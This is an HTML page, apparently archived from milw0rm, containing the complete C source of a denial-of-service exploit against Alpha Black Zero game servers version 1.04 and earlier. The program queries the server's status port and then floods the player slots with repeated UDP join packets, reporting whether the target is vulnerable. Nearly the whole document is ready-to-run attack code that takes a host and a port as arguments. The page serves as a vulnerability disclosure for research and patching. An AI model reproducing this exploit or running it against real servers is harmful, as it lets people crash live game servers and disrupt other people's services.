<html>
<head>
<title>Alpha Black Zero 1.04 and below server crash </title>
<pre>
/*

by Luigi Auriemma

*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;

#ifdef WIN32
    #include &lt;winsock.h&gt;
#include &lt;string.h&gt;
#include &lt;errno.h&gt;



void std_err(void) {
    char    *error;

    switch(WSAGetLastError()) {
        case 10004: error = &quot;Interrupted system call&quot;; break;
        case 10009: error = &quot;Bad file number&quot;; break;
        case 10013: error = &quot;Permission denied&quot;; break;
        case 10014: error = &quot;Bad address&quot;; break;
        case 10022: error = &quot;Invalid argument (not bind)&quot;; break;
        case 10024: error = &quot;Too many open files&quot;; break;
        case 10035: error = &quot;Operation would block&quot;; break;
        case 10036: error = &quot;Operation now in progress&quot;; break;
        case 10037: error = &quot;Operation already in progress&quot;; break;
        case 10038: error = &quot;Socket operation on non-socket&quot;; break;
        case 10039: error = &quot;Destination address required&quot;; break;
        case 10040: error = &quot;Message too long&quot;; break;
        case 10041: error = &quot;Protocol wrong type for socket&quot;; break;
        case 10042: error = &quot;Bad protocol option&quot;; break;
        case 10043: error = &quot;Protocol not supported&quot;; break;
        case 10044: error = &quot;Socket type not supported&quot;; break;
        case 10045: error = &quot;Operation not supported on socket&quot;; break;
        case 10046: error = &quot;Protocol family not supported&quot;; break;
        case 10047: error = &quot;Address family not supported by protocol family&quot;; break;
        case 10048: error = &quot;Address already in use&quot;; break;
        case 10049: error = &quot;Can't assign requested address&quot;; break;
        case 10050: error = &quot;Network is down&quot;; break;
        case 10051: error = &quot;Network is unreachable&quot;; break;
        case 10052: error = &quot;Net dropped connection or reset&quot;; break;
        case 10053: error = &quot;Software caused connection abort&quot;; break;
        case 10054: error = &quot;Connection reset by peer&quot;; break;
        case 10055: error = &quot;No buffer space available&quot;; break;
        case 10056: error = &quot;Socket is already connected&quot;; break;
        case 10057: error = &quot;Socket is not connected&quot;; break;
        case 10058: error = &quot;Can't send after socket shutdown&quot;; break;
        case 10059: error = &quot;Too many references, can't splice&quot;; break;
        case 10060: error = &quot;Connection timed out&quot;; break;
        case 10061: error = &quot;Connection refused&quot;; break;
        case 10062: error = &quot;Too many levels of symbolic links&quot;; break;
        case 10063: error = &quot;File name too long&quot;; break;
        case 10064: error = &quot;Host is down&quot;; break;
        case 10065: error = &quot;No Route to Host&quot;; break;
        case 10066: error = &quot;Directory not empty&quot;; break;
        case 10067: error = &quot;Too many processes&quot;; break;
        case 10068: error = &quot;Too many users&quot;; break;
        case 10069: error = &quot;Disc Quota Exceeded&quot;; break;
        case 10070: error = &quot;Stale NFS file handle&quot;; break;
        case 10091: error = &quot;Network SubSystem is unavailable&quot;; break;
        case 10092: error = &quot;WINSOCK DLL Version out of range&quot;; break;
        case 10093: error = &quot;Successful WSASTARTUP not yet performed&quot;; break;
        case 10071: error = &quot;Too many levels of remote in path&quot;; break;
        case 11001: error = &quot;Host not found&quot;; break;
        case 11002: error = &quot;Non-Authoritative Host not found&quot;; break;
        case 11003: error = &quot;Non-Recoverable errors: FORMERR, REFUSED, NOTIMP&quot;; break;
        case 11004: error = &quot;Valid name, no data record of requested type&quot;; break;
        default: error = strerror(errno); break;
    }
    fprintf(stderr, &quot;\nError: %s\n&quot;, error);
    exit(1);
}




    #define close   closesocket
#else
    #include &lt;unistd.h&gt;
    #include &lt;sys/socket.h&gt;
    #include &lt;sys/types.h&gt;
    #include &lt;arpa/inet.h&gt;
    #include &lt;netdb.h&gt;
#endif



#define VER     &quot;0.1&quot;
#define BUFFSZ  2048
#define PORT    29850
#define TIMEOUT 3
#define MAX     16
#define INFO    &quot;\\status\\&quot;
#define PCK     &quot;\x2e\x00\x00\x00\x00\x00\x2f\x2f\x01\x00\x00\x00\x41&quot;
                // this is a normal join packet, nothing of strange



void show_info(u_char *buff);
u_long resolv(char *host);
int timeout(int sock);
void std_err(void);



int main(int argc, char *argv[]) {
    struct  sockaddr_in peer;
    int         sd,
                i;
    u_short     port = PORT;
    u_char      buff[BUFFSZ];


    setbuf(stdout, NULL);

    fputs(&quot;\n&quot;
        &quot;Alpha Black Zero &lt;= 1.04 server crash &quot;VER&quot;\n&quot;
        &quot;by Luigi Auriemma\n&quot;
        &quot;e-mail: aluigi@altervista.org\n&quot;
        &quot;web:    http://aluigi.altervista.org\n&quot;
        &quot;\n&quot;, stdout);

    if(argc &lt; 2) {
        printf(&quot;\n&quot;
            &quot;Usage: %s &lt;host&gt; [port(%d)]\n&quot;
            &quot;\n&quot;, argv[0], PORT);
        exit(1);
    }

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &amp;wsadata);
#endif

    if(argc &gt; 2) port = atoi(argv[2]);

    peer.sin_addr.s_addr  = resolv(argv[1]);
    peer.sin_port         = htons(port + 1);
    peer.sin_family       = AF_INET;

    printf(&quot;- target %s:%hu\n&quot;,
        inet_ntoa(peer.sin_addr),
        port);

    printf(&quot;- request informations to the query port %d\n&quot;, port + 1);
    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(!sd) std_err();
    if(sendto(sd, INFO, sizeof(INFO) - 1, 0, (struct sockaddr *)&amp;peer, sizeof(peer))
      &lt; 0) std_err();
    if(timeout(sd) &lt; 0) {
        fputs(&quot;\nAlert: socket timeout, no information reply received but I continue\n&quot;, stdout);
    } else {
        if(recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL)
          &lt; 0) std_err();
        show_info(buff);
    }
    close(sd);

    peer.sin_port         = htons(port);

    sd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if(!sd) std_err();

    fputs(&quot;- start attack\n&quot;, stdout);
    for(i = 0; i &lt; MAX; i++) {
        fputs(&quot;  player: &quot;, stdout);
        if(sendto(sd, PCK, sizeof(PCK) - 1, 0, (struct sockaddr *)&amp;peer, sizeof(peer))
          &lt; 0) std_err();
        fputc('.', stdout);

        if(timeout(sd) &lt; 0) break;  // packet 1
        if(recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL)
          &lt; 0) std_err();
        fputc('.', stdout);

        if(timeout(sd) &lt; 0) break;  // packet 2
        if(recvfrom(sd, buff, BUFFSZ, 0, NULL, NULL)
          &lt; 0) std_err();
        fputc('.', stdout);
        fputc('\n', stdout);
    }

    close(sd);

    if(i &amp;&amp; (i &lt;= MAX)) {
        fputs(&quot;\n\nServer IS vulnerable!!!\n\n&quot;, stdout);
    } else {
        fputs(&quot;\n\nServer doesn't seem vulnerable\n\n&quot;, stdout);
    }

    return(0);
}



void show_info(u_char *data) {
    int     nt = 1;
    u_char  *p;

    while((p = strchr(data, '\\'))) {
        *p = 0x00;
        if(!nt) {
            printf(&quot;%30s: &quot;, data);
            nt++;
        } else {
            printf(&quot;%s\n&quot;, data);
            nt = 0;
        }
        data = p + 1;
    }
    printf(&quot;%s\n&quot;, data);
}



u_long resolv(char *host) {
    struct hostent *hp;
    u_long host_ip;

    host_ip = inet_addr(host);
    if(host_ip == INADDR_NONE) {
        hp = gethostbyname(host);
        if(!hp) {
            printf(&quot;\nError: Unable to resolv hostname (%s)\n&quot;, host);
            exit(1);
        } else host_ip = *(u_long *)hp-&gt;h_addr;
    }
    return(host_ip);
}



int timeout(int sock) {
    struct  timeval tout;
    fd_set  fd_read;
    int     err;

    tout.tv_sec = TIMEOUT;
    tout.tv_usec = 0;
    FD_ZERO(&amp;fd_read);
    FD_SET(sock, &amp;fd_read);
    err = select(sock + 1, &amp;fd_read, NULL, NULL, &amp;tout);
    if(err &lt; 0) std_err();
    if(!err) return(-1);
    return(0);
}



#ifndef WIN32
    void std_err(void) {
        perror(&quot;\nError&quot;);
        exit(1);
    }
#endif

</pre>
//milw0rm.com
</html>

